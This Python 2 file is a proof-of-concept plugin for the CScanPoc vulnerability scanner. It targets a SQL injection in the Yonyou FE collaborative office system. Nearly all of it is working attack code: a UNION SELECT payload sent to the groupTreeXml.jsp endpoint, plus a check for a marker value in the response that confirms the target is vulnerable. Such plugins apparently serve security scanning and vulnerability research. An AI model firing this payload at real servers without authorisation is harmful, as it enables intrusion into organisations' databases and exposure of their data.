# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Yonyou_0000' # 平台漏洞编号，留空
    name = '用友FE协作办公系统SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
        用友FE协作办公系统SQL注入漏洞
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=093724' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8e8889b8-4590-4e5a-b146-35f50bb6ec77'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/system/config/groupTreeXml.jsp?type=group&SG04=1%27+UNION+ALL+SELECT+1,99999-33333,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--'
            url = '{target}'.format(target=self.target)+payload
            code, head, body, errcode, _url = hh.http(url)
                       
            if code == 200 and '66666' in body:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()